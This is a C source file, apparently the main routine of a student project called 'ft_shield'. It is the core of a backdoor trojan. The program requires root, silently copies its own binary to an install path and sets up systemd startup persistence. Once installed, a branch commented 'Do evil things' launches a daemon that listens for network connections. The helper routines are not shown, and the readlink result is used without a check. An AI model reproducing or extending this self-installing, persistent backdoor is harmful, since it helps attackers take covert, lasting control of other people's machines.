#include "../includes/ft_shield.h"
// Check PATH where it is executed
// ANSWER: readlink to retrive full path of the executable
// https://stackoverflow.com/questions/933850/how-do-i-find-the-location-of-the-executable-in-c
int main ( void )
{
    char buf[1024];
    // check where is it executed
    int i = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    buf[i] = '\0';
    if (getuid() != 0) {
        dprintf(STDERR_FILENO, "Run as root\n");
        return EXIT_FAILURE;
    }
    if (strcmp(buf, EXECUTABLE_FILE)) {
        printf("robrodri & jalvarad.\n");
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        copy_payload(buf);
        // systems without systemctl will not work
        startup_setup();
    }
    else { // Do evil things
        t_daemon *daemon = create_daemon();
        server_listen(daemon);
        free(daemon);
    }
    return (EXIT_SUCCESS);
}